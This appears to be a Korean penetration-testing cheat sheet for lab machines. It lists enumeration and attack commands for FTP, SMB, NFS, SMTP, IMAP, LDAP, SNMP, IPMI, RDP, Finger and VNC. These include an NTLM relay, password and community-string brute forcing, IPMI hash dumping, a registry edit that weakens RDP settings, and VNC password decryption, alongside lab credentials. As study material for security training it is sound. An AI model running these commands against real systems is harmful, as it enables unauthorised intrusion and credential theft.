<details>
  <summary><strong>📡 FTP SSL Certificate</strong></summary>

### FTP over SSL 연결 테스트
FTP 서버가 SSL/TLS를 지원하는지 확인하고 암호화된 연결을 수립합니다.

```bash
# FTP over SSL 연결 (STARTTLS 방식)
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

### 체크리스트
- ✅ Nmap 스캔 시 `AUTH TLS` 확인 → SSL 연결 지원
- ✅ `ls -al`로 숨김 파일 확인 (`.` 으로 시작하는 파일)
- ✅ 파일 업로드 권한 테스트 (익명 사용자 쓰기 권한 확인)

> **Security Note**: 익명 로그인이 허용되고 쓰기 권한이 있다면 웹 쉘 업로드 가능성이 있습니다.

### FTP 다운로드 실패시.
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```

</details>

---
<details>
  <summary><strong>🖥️ SMB & RPC Client</strong></summary>

### SMB (Server Message Block)
Windows 환경에서 파일 및 프린터 공유에 사용되는 프로토콜입니다.

### SMB 일괄 다운로드
```
smbclient --user r.thompson //10.10.10.182/data rY4n5eva

smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

#### NTLM Relay Attack
인증 정보를 가로채어 다른 서비스로 전달하는 공격 기법입니다.

```bash
# NTLM Relay 공격 수행
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '<payload>'
```

### RPC Client (Remote Procedure Call)
Windows 시스템의 원격 관리 인터페이스로, 도메인 정보 수집에 유용합니다.

#### RPC Client 연결

```bash
# 익명 접속 (계정 없이 접속 시도)
# -U '': 빈 사용자명
# -N: 패스워드 없음
rpcclient -U '' -N 10.129.23.91
```

#### RPC Client 내부 명령어

```bash
# 도메인 정보 조회 (도메인 이름, SID 등)
querydominfo

# 모든 공유 폴더 나열
netshareenumall

# 특정 공유 폴더 상세 정보
netsharegetinfo <share>

# 도메인 사용자 나열 (RID 포함)
enumdomusers

# 특정 사용자 정보 조회 (RID로 조회)
queryuser <RID>
```

#### 주요 명령어 설명

| 명령어 | 기능 | 출력 정보 |
|--------|------|----------|
| `querydominfo` | 도메인, 서버, 사용자 정보 제공 | 도메인 이름, SID, 사용자 수 |
| `netshareenumall` | 사용 가능한 모든 공유 폴더 열거 | 공유 이름, 유형, 설명 |
| `netsharegetinfo` | 특정 공유 폴더의 상세 정보 | 경로, 권한, 최대 사용자 수 |
| `enumdomusers` | 모든 도메인 사용자 열거 | 사용자명, RID |
| `queryuser` | 특정 사용자의 상세 정보 (RID 필요) | 그룹 멤버십, 로그온 시간 등 |

> **Tip**: RID 500은 일반적으로 Administrator 계정입니다.
  
</details>

---
<details>
  <summary><strong>📂 NFS (Network File System)</strong></summary>

**포트**: 111 (rpcbind), 2049 (nfsd)  
**설명**: Unix/Linux 시스템 간 파일 공유 프로토콜

### NFS 공유 목록 확인 및 마운트

```bash
# 공유된 NFS 목록 확인
showmount -e <target>

# NFS 마운트
# -t nfs: 파일 시스템 타입 지정
# -o nolock: 파일 잠금 비활성화 (권한 문제 회피)
sudo mount -t nfs 10.129.14.128:/target ./target/ -o nolock

# 언마운트
sudo umount ./target
```

> **Security Note**: NFS는 기본적으로 인증이 약하므로, 민감한 데이터가 노출될 수 있습니다.

> **Tip**: `no_root_squash` 옵션이 설정된 경우 root 권한 상승이 가능합니다.

> 접근이 불가능할 경우 `UID`를 `usermod`로 바꿔서 시도.

### usermod

<img width="1103" height="128" alt="image" src="https://github.com/user-attachments/assets/a3b3641e-69f5-4310-abe2-a4c93982b734" />

```bash
sudo adduser dummy

sudo usermod -u 2017 dummy
```

</details>

---
<details>
  <summary><strong>📧 SMTP Enumeration</strong></summary>

**포트**: 25 (SMTP), 465 (SMTPS), 587 (Submission)  
**설명**: 이메일 전송 프로토콜, 사용자 열거 및 인증 테스트 가능

### SMTP 사용자 열거
SMTP 명령어를 이용해 유효한 사용자 계정을 찾아냅니다.

```bash
# VRFY 명령어를 이용한 사용자 열거
# -M VRFY: VRFY 명령어 사용 (사용자 존재 확인)
# -U: 사용자명 워드리스트
# -t: 타겟 IP
# -w 20: 타임아웃 20초 (일부 SMTP 서버는 응답이 느림)
# -v: Verbose 모드
smtp-user-enum -M VRFY -U footprinting-wordlist.txt -t 10.129.42.195 -w 20 -v

# RCPT TO 명령어를 이용한 사용자 열거
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

# EXPN 명령어를 이용한 메일링 리스트 확장
smtp-user-enum -M EXPN -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

### SMTP 비밀번호 브루트포스

```bash
# Hydra를 이용한 SMTP 인증 브루트포스
hydra -l 'marlin@inlanefreight.htb' -P pws.list smtp://10.129.203.12

swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password homenetworkingadministrator --quit-after AUTH --server mailing.htb
```

#### 열거 방법 비교

| 방법 | 명령어 | 특징 |
|------|--------|------|
| `VRFY` | 사용자 존재 확인 | 가장 직접적, 많은 서버에서 비활성화 |
| `RCPT TO` | 수신자 확인 | 메일 전송 시뮬레이션, 우회 가능성 높음 |
| `EXPN` | 메일링 리스트 확장 | 그룹 멤버 확인 가능 |

> **Note**: 일부 SMTP 서버는 응답 시간이 길 수 있으므로 타임아웃을 충분히 설정하세요.  
> **Warning**: 과도한 열거 시도는 로그에 기록되거나 IP가 차단될 수 있습니다.
  
</details>

---
<details>
  <summary><strong>📬 IMAP & POP3</strong></summary>

**포트**: 143 (IMAP), 993 (IMAPS), 110 (POP3), 995 (POP3S)  
**설명**: 이메일 수신 프로토콜

### SSL 연결 테스트

```bash
# POP3S 연결 (SSL/TLS 암호화)
openssl s_client -connect 10.129.14.128:pop3s

# IMAPS 연결 (SSL/TLS 암호화)
openssl s_client -connect 10.129.14.128:imaps
```

### IMAP 명령어 (Telnet)
IMAP을 통해 메일박스에 접근하고 메일을 읽습니다.

```bash
# IMAP 연결 (평문)
telnet <ip> 143

# 로그인
a LOGIN <id> <password>

# 메일박스 목록 조회
a LIST "" *

# 메일박스 선택 (대소문자 구분!)
a SELECT INBOX

# 모든 메일 검색
a SEARCH ALL

# 메일 헤더 확인 (발신자, 수신자, 제목 등)
a fetch <NUMBER> body[header]

# 메일 본문 확인
a fetch <NUMBER> body[text]

# 로그아웃
a LOGOUT
```

> **Warning**: 메일박스 이름은 대소문자를 구분합니다. `INBOX`와 `inbox`는 다릅니다.  
> **Tip**: `a`는 태그(tag)로, 명령어 식별자입니다. 임의의 문자열 사용 가능합니다.

### POP3
<img width="717" height="231" alt="image" src="https://github.com/user-attachments/assets/efc6609e-aee2-4963-8586-7a9718477f23" />

<br>
<br>

<img width="764" height="449" alt="image" src="https://github.com/user-attachments/assets/a5a1b905-4b0c-4469-b8d7-ef2a49234642" />

</details>

---
<details>
  <summary><strong>🔍 LDAP (Lightweight Directory Access Protocol)</strong></summary>

**포트**: 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog)  
**설명**: 디렉터리 서비스 조회 및 수정 프로토콜, Active Directory 정보 수집에 필수

### LDAP 검색

```bash
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"

ldapsearch -H ldap://10.129.14.128 -x -b "dc=inlanefreight,dc=local" "(objectClass=user)"
```
  
</details>

---
<details>
  <summary><strong>🔐 SNMP (Simple Network Management Protocol)</strong></summary>

**포트**: 161 (UDP)  
**설명**: 네트워크 장비 모니터링 및 관리 프로토콜

### 기본 쿼리
SNMP를 통해 시스템 정보, 네트워크 설정, 프로세스 정보 등을 수집합니다.

```bash
# SNMP Walk (단일 OID 조회)
# -v2c: SNMP 버전 2c 사용
# -c public: Community String 지정
snmpwalk -v2c -c public 10.129.14.128

# SNMP Bulk Walk (대량 데이터 수집, 더 효율적)
snmpbulkwalk -c public -v2c 10.10.10.10 . > result

# Community String 지정 (커스텀 Community String 사용 시)
snmpbulkwalk -c <community_string> -v2c <ip> . > result
```

### Community String 찾기
Community String은 SNMP의 "비밀번호" 역할을 합니다.

```bash
# Community String 브루트포스
# 일반적인 Community String: public, private, manager
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

> **Note**:  
> - `snmpbulkwalk`는 SNMP v2c부터 사용 가능  
> - 타임아웃 발생 시 다른 community string 시도  
> - 기본 Community String "public"은 읽기 전용, "private"는 읽기/쓰기 가능한 경우가 많습니다.
  
</details>

---
<details>
  <summary><strong>🖧 IPMI (Intelligent Platform Management Interface)</strong></summary>

**포트**: 623 (UDP)  
**설명**: 원격 서버 관리를 위한 인터페이스 (Dell iDRAC, HP iLO 등)

IPMI는 원격 서버 관리를 위한 인터페이스로, 취약한 설정 시 해시 덤프가 가능합니다.

### Nmap 스크립트

```bash
# IPMI 버전 확인
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

### Metasploit 모듈
IPMI 2.0의 인증 우회 취약점을 이용해 패스워드 해시를 덤프합니다.

```bash
# IPMI 버전 확인
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <target>
run

# IPMI 해시 덤프 (RAKP 인증 취약점 이용)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target>
set USER_FILE <userlist>
run
```

> **Security Note**: 덤프된 해시는 Hashcat으로 크랙 가능합니다 (mode 7300).  
> **Tip**: 기본 계정은 ADMIN, Administrator, root 등을 시도해보세요.
  
</details>

---
<details>
  <summary><strong>🖥️ RDP (Remote Desktop Protocol)</strong></summary>

**포트**: 3389  
**설명**: Windows 원격 데스크톱 프로토콜

### Restricted Admin Mode 활성화
일부 취약점 공격을 위해 Restricted Admin Mode를 비활성화합니다.

```powershell
# Restricted Admin Mode 비활성화 (레지스트리 수정)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### xfreerdp 연결
xfreerdp를 이용한 RDP 연결 및 파일 공유 설정입니다.

```bash
# RDP 연결 with 로컬 드라이브 공유
# /v: 타겟 IP
# /u: 사용자명
# /p: 패스워드
# /drive: 로컬 폴더를 원격 세션에 마운트
xfreerdp /v:10.10.10.132 /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

### 체크리스트
침투 테스트 시 RDP 접근 후 확인할 사항:

- ✅ 특정 프로그램을 관리자 권한으로 실행 가능한지 확인
- ✅ `cmd.exe` 또는 `powershell.exe`를 관리자로 실행 가능한지 테스트
- ✅ UAC (User Account Control) 설정 확인
- ✅ 로컬 관리자 그룹 멤버십 확인
- ✅ 저장된 RDP 연결 정보 확인 (`%USERPROFILE%\Documents\Default.rdp`)

> **Tip**: `/drive` 옵션으로 로컬 파일을 원격 시스템으로 쉽게 전송할 수 있습니다.  
> **Warning**: BlueKeep (CVE-2019-0708) 등 RDP 취약점 존재 시 익스플로잇 가능성을 확인하세요.
  
</details>

---
<details>
  <summary><strong>FINGER(79)</strong></summary>

## User Enum
```bash
wget https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/refs/heads/master/finger-user-enum.pl

./finger-user-enum.pl -U users.txt -t 10.0.0.1
```
  
</details>

---
<details>
  <summary><strong>VNC(5901)</strong></summary>

- `RFB` 프로토콜 사용.
<img width="1105" height="60" alt="image" src="https://github.com/user-attachments/assets/bdccb847-f5b0-441a-8018-c393a9c58903" />

<br>
<br>

```bash
vncviewer :5901 -passwd secret
```

## Decrypt Password
- https://github.com/frizb/PasswordDecrypts
- `hex` 코드를 얻으면 비밀번호를 복호화 할 수 있다.
<img width="1103" height="519" alt="image" src="https://github.com/user-attachments/assets/cd0b32b6-a89d-45dd-a70a-03e0a8d48c9c" />

```bash
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```
  
</details>
